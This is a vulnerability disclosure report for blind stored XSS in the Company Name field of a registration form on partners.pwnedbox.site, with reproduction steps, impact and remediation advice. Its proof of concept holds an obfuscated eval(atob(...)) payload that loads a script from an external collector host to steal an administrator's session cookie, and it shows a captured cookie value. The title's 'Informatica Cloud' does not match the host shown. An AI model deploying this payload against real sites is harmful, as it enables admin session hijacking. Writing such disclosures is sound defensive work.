## Title
Blind XSS in Account Registration Company Name Parameter - Informatica Cloud

## Description
**Affected URL:** https://partners.pwnedbox.site/index.php?view=register (triggers on https://partners.pwnedbox.site/index.php?view=admin_dashboard)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the user account registration form on `partners.pwnedbox.site`. Input submitted in the **Company Name** field is stored without HTML encoding and renders directly in the DOM when an administrator views the admin dashboard (`?view=admin_dashboard`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://partners.pwnedbox.site/index.php?view=register`, fill in the required account details, paste the Blind XSS payload into the **Company Name** field, and click **Create Account**.
2. Log in to the admin panel (`https://partners.pwnedbox.site/index.php?view=admin_dashboard`).
3. Observe the payload execute immediately upon loading the dashboard under **Recent Registrations**, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://partners.pwnedbox.site/index.php?view=register` (`Company Name` field)

**Trigger Endpoint:** `https://partners.pwnedbox.site/index.php?view=admin_dashboard`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://partners.pwnedbox.site/index.php?view=admin_dashboard`
- **Exfiltrated Session Cookie:** `PHPSESSID=92285c4c0bd90bf59d8aa5249e49ef3b`

**Visual Evidence:**
- Account registration form on `partners.pwnedbox.site/index.php?view=register` with the Blind XSS payload entered in the **Company Name** field.
  <img width="1400" height="942" alt="image" src="https://github.com/user-attachments/assets/bf45ee8d-eced-4e76-9c7c-538defcdb0d1" /><br><br>

- Admin dashboard (`/index.php?view=admin_dashboard`) rendering the broken image icon directly in the **COMPANY** column under **Recent Registrations**, alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1917" height="915" alt="image" src="https://github.com/user-attachments/assets/0d7a3995-3b0e-4b06-969f-8982a156dfe0" /><br><br>

- Blind XSS collector report confirming execution on `/index.php?view=admin_dashboard` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1561" height="1007" alt="image" src="https://github.com/user-attachments/assets/bef3ef66-6760-4e92-96f8-d27387d2bdd3" /><br>


## Impact
Because the payload executes automatically as soon as an administrator opens the admin dashboard without requiring any interaction beyond viewing registered users:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, modify, or manage all registered user accounts, company profiles, and platform settings.
- **Persistent Compromise:** Attackers can use the hijacked admin session to alter user privileges or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied registration fields (`Company Name`, `Full Name`, etc.) before rendering them in `?view=admin_dashboard` and user management views.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on admin views (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
